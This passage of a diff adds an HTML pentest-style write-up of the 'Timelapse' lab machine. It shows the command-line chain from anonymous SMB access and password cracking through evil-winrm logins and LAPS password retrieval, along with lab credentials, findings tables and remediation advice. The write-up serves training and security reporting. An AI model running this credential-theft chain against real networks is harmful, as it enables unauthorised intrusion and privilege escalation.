+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Shares          Disk      
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.227.113 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/1.png" alt="">
+                        </div>
+                        <p>We try to enumerate <i>Shares</i> resource and notice that we can access without credentials. Inside we find two folders. We download them to analyze them better locally.</p>
+                        <div class="console-code">
+                            <pre>
+smb: \> dir
+  .                                   D        0  Mon Oct 25 11:39:15 2021
+  ..                                  D        0  Mon Oct 25 11:39:15 2021
+  Dev                                 D        0  Mon Oct 25 15:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
+
+                6367231 blocks of size 4096. 1338148 blocks available
+smb: \> recurse on
+smb: \> prompt off
+smb: \> mget *
+getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (15.8 KiloBytes/sec) (average 15.8 KiloBytes/sec)
+getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (2696.3 KiloBytes/sec) (average 1933.8 KiloBytes/sec)
+getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (698.5 KiloBytes/sec) (average 1680.5 KiloBytes/sec)
+getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (2873.1 KiloBytes/sec) (average 1960.1 KiloBytes/sec)
+getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (489.5 KiloBytes/sec) (average 1761.7 KiloBytes/sec)
+smb: \> 
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                             <img src="../images/Posts/Timelapse/2.png" alt="">
+                        </div>
+                        <p>In the <i>Dev</i> directory we find the password protected <i>winrm_backup.zip</i> file. We will try to crack it with <strong>John</strong> tool, but first we will extract the file hash with <strong>zip2john</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/3.png" alt="">
+                        </div>
+                        <div class="console-code">
+                            <pre>
+$ john hash -w=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
+1g 0:00:00:00 DONE (2024-12-22 07:17) 3.030g/s 10513Kp/s 10513Kc/s 10513KC/s surkerior..suppamas
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+$ ls
+hash  legacyy_dev_auth.pfx  winrm_backup.zip
+                            </pre>
+                        </div>
+                        <p>We have successfully cracked the file. Unzipping the file we find the <i>legacyy_dev_auth.pfx</i> file. This is a PFX file containing an SSL certificate in <strong>PKCS#12</strong> format and a <strong>private key</strong>. <strong>WinRM</strong> can use PFX files to log in without a password. Since the file contains a password we proceed to crack it and we have successfully cracked it.</p>
+                        <div class="console-code">
+                            <pre>
+$ john hash1 -w=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+thuglegacy       (legacyy_dev_auth.pfx)     
+1g 0:00:00:41 DONE (2024-12-22 07:35) 0.02384g/s 77062p/s 77062c/s 77062C/s thuglife06..thug211
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/4.png" alt="">
+                        </div>
+                        <p>With the cracked password from the <i>legacyy_dev_auth.pfx</i> file we proceed to extract the SSL certificate and the private key.</p>
+                        <div class="console-code">
+                            <pre>
+$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate.crt
+$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out priv_key.key
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/5.png" alt="">
+                            <img src="../images/Posts/Timelapse/6.png" alt="">
+                        </div>
+                    </section>
+                                                          
+                    <section id="Foothold">
+                        <h2>6.2 Foothold</h2>
+                        <p>Once we have the SSL certificate and generated private key, we are now able to authenticate via <strong>winrm</strong> without providing credentials. Once logged in, we perform manual enumeration to see if we find any misconfigurations or excessive privileges.</p>
+                        <div class="console-code">
+                            <pre>
+$ evil-winrm -S -i 10.129.227.113 -c certificate.crt -k priv_key.key                                              
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
+timelapse\legacyy
+*Evil-WinRM* PS C:\Users\legacyy\Documents>
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/7.png" alt="">
+                        </div>
+                        <p>Reviewing the command history, we found clear text credentials in this file: <i>C:\Users\legacyy\APPDATA\roaming\microsoft\windows\powershell\psreadlin\ConsoleHost_history.txt</i>.</p>
+                        <div class="console-code">
+                            <pre>
+*Evil-WinRM* PS C:\Users\legacyy\APPDATA\roaming\microsoft\windows\powershell\psreadline> type ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/8.png" alt="">
+                            <img src="../images/Posts/Timelapse/9.png" alt="">
+                        </div>
+                        <p>So with this credentials we authenticate using <strong>evil-winrm</strong> as the `<strong>svc_deploy</strong>` user.</p>
+                        <div class="console-code">
+                            <pre>
+evil-winrm -S -i 10.129.227.113 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
+timelapse\svc_deploy
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/10.png" alt="">
+                        </div>
+                    </section>
+                    
+                    <section id="Privilege-Escalation">
+                        <h2>6.3 Privilege Escalation</h2>
+                        <p>Performing basic user privilege enumeration, we find that the user `<strong>svc_deploy</strong>` belongs to the <strong>LAPS_Readers</strong> group. With these permissions we can read the <strong>ms-Mcs-AdmPwd</strong> property. This is an Active Directory (<strong>AD</strong>) object, which stores the password generated by <strong>LAPS</strong> (Local Administrator Password Solution) for the local administrator account.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/11.png" alt="">
+                        </div>
+                        <p>With this command we extract information about the computer type objects from the DC: <strong>Get-ADComputer -Filter 'ObjectClass -eq "computer"' -property *</strong></p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/12.png" alt="">
+                        </div>
+                        <p>We found the password in clear text in the `<strong>ms-Mcs-AdmPwd</strong>` property.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/13.png" alt="">
+                        </div>
+                        <p>And finally, with this password we log in through <strong>winrm</strong> as system administrator.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/14.png" alt="">
+                        </div>
+                    </section>
+
+                    <section id="Remmediation-Summary">
+                        <h1>7. Remmediation Summary</h1>
+                        <p>As a result of this assessment, there are several opportunities for <strong>Tiemlapse</strong> to strengthen the security of its internal network. Remediation efforts are then prioritized, starting with those likely to require the least amount of time and effort to complete. <strong>Tabby</strong> must ensure that all remediation steps and mitigation controls are carefully planned and tested to prevent service interruptions or data loss.</p>
+                        <section id="Short-Term">
+                            <h2>7.1 Short Term</h2>
+                            <ul>
+                                <li><span style="color: greenyellow;">[Finding 1]</span> Implement mandatory authentication for SMB shares.</li>
+                                <li><span style="color: greenyellow;">[Finding 3]</span> Change weak passwords and apply strong encryption to protect sensitive files.</li>
+                                <li><span style="color: greenyellow;">[Finding 4]</span> Configure policies to prevent storing plain text passwords in the PowerShell history.</li>
+                            </ul>
+                        </section>
+                        <section id="Medium-Term">
+                            <h2>7.2 Medium Term</h2>
+                            <ul>
+                                <li><span style="color: greenyellow;">[Finding 2]</span> Review LAPS access permissions and limit privileges for non-administrative users.</li>
+                                <li><span style="color: greenyellow;">[Finding 3]</span> Conduct regular audits on password usage and access to sensitive files.</li>
+                            </ul>                            
+                        </section>
+                        <section id="Long-Term">
+                            <h2>7.3 Long Term</h2>
+                            <ul>
+                                <li><span style="color: greenyellow;">[Finding 3]</span> Implement a centralized password management solution to ensure all credentials are managed and stored securely.</li>
+                                <li>Conduct regular penetration testing to identify emerging vulnerabilities and maintain security posture.</li>
+                            </ul>
+                        </section>
+                    </section>
+                    <section id="Technical-Findings-Details">
+                        <h1>8. Technical Findings Details</h1>
+                        <h3>Unauthenticated SMB Access - <span style="color: rgb(160, 0, 0)">Critical</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-darkRed">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/287.html" target="_blank">CWE-287</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-darkRed">CVSS</td>
+                                    <td id="column-2-2">9.1</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-darkRed">Description</td>
+                                    <td id="column-2-1">Weak authentication enforcement on SMB shares (`Shares` folder accessible without credentials).</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-darkRed">Security Impact</td>
+                                    <td id="column-2-2">Unauthorized access to sensitive data stored in SMB shares (`Dev` and `HelpDesk` folders). Attackers can harvest sensitive files like `winrm_backup.zip`, leading to further exploitation.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-darkRed">Remediation</td>
+                                    <td id="column-2-1">Enforce strict authentication and access controls on all SMB shares. Disable anonymous access and regularly review file share permissions.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>Using `<strong>smbclient -L 10.129.227.113 -N</strong>`, the SMB share <strong>Shares</strong> was accessible without credentials. The folders <i>Dev</i> and <i>HelpDesk</i> were browsed, and sensitive files like <i>winrm_backup.zip</i> were retrieved.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/1.png" alt="">
+                            <img src="../images/Posts/Timelapse/2.png" alt="">
+                        </div>
+                        
+                        <h3>Excessive Privileges on LAPS - <span style="color:red"> High</span> </h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-red">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/269.html" target="_blank">CWE-269</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-red">CVSS</td>
+                                    <td id="column-2-2">8.8</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Description</td>
+                                    <td id="column-2-1">Excessive privileges assigned to user (`svc_deploy`).</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Security Impact</td>
+                                    <td id="column-2-2">The user `svc_deploy` is a member of the `LAPS_Readers` group, allowing unauthorized access to `ms-Mcs-AdmPwd`, which stores the administrator password in plaintext. This could lead to privilege escalation to Domain Admin.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Remediation</td>
+                                    <td id="column-2-1">Limit access to sensitive attributes like `ms-Mcs-AdmPwd` to administrative users only. Regularly audit AD group memberships and sensitive permissions.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>The `<strong>Get-ADComputer</strong>` command retrieved the `<strong>ms-Mcs-AdmPwd</strong>` attribute, exposing the local administrator password. This led to full access to the domain controller.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/12.png" alt="">
+                            <img src="../images/Posts/Timelapse/13.png" alt="">
+                        </div>
+
+                        <h3>Weak ZIP Password - <span style="color:red">High</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-red">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/255.html" target="_blank">CWE-255</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-red">CVSS</td>
+                                    <td id="column-2-2">7.5</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Description</td>
+                                    <td id="column-2-1">Lack of proper encryption for sensitive information (ZIP file password exposed).</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Security Impact</td>
+                                    <td id="column-2-2">Sensitive information (e.g., private key and certificates) is stored in a ZIP file with a weak password. Exploiting this vulnerability allows unauthorized access to WinRM and lateral movement within the system.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Remediation</td>
+                                    <td id="column-2-1">Use strong encryption and robust passwords for protecting sensitive files. Audit sensitive data storage regularly and restrict file access to authorized users only.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>The file <i>winrm_backup.zip</i> was downloaded from the SMB share and cracked using <strong>John the Ripper</strong>, revealing the password <i>supremelegacy</i>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/3.png" alt="">
+                        </div>
+                        <p>Extraction of the archive revealed the file <i>legacyy_dev_auth.pfx</i>, containing private keys used for <strong>WinRM</strong> authentication.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/4.png" alt="">
+                            <img src="../images/Posts/Timelapse/5.png" alt="">
+                            <img src="../images/Posts/Timelapse/6.png" alt="">
+                        </div>
+
+                        <h3>Plaintext Password in PowerShell History - <span style="color:orange">Medium</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-orange">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/312.html" target="_blank">CWE-312</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-orange">CVSS</td>
+                                    <td id="column-2-2">6.5</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Description</td>
+                                    <td id="column-2-1">Sensitive data exposed in PowerShell command history (`ConsoleHost_history.txt`).</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Security Impact</td>
+                                    <td id="column-2-2">Command history files contained plaintext passwords (`E3R$Q62^12p7PLlC%KWaxuaV`) used for accessing sensitive accounts. This vulnerability allows attackers to harvest credentials and escalate privileges.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Remediation</td>
+                                    <td id="column-2-1">Clear command histories regularly and configure PowerShell to avoid storing sensitive information in plaintext. Educate users on secure credential handling.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>Analysis of the file <i>ConsoleHost_history.txt</i> located at <i>C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline</i> revealed credentials for the <strong>svc_deploy</strong> account (`<strong>E3R$Q62^12p7PLlC%KWaxuaV</strong>`).</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Timelapse/8.png" alt="">
+                        </div>
+                    </section>                   
+                   
+                    <section id="Conclusion">
+                        <h1>7. Conclusion</h1>
+                        <p>The security assessment conducted has identified several critical vulnerabilities affecting <strong>Timelapse</strong>'s infrastructure. While several points for improvement were identified, the recommendations provided should be implemented quickly to mitigate immediate risks and protect the organization's assets.</p>
+                        <p>Commitment to security should not be a one-time process, but rather an ongoing activity. <strong>Timelapse</strong> is encouraged to take a proactive approach to security, maintaining regular audits, educating employees on best practices, and improving internal controls to prevent potential breaches in the future.</p>
+                    </section>
+                    
+                    <section id="Appendices">
+                        <h1> 8. Appendices</h1>              
+                    </section>
+                    <!--Final-->
+                </section>
+            </div>
+        </div>
+    </div>
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <!--Pet Cat-->
+    <script src="script.js"></script>
+</body>
+</html>
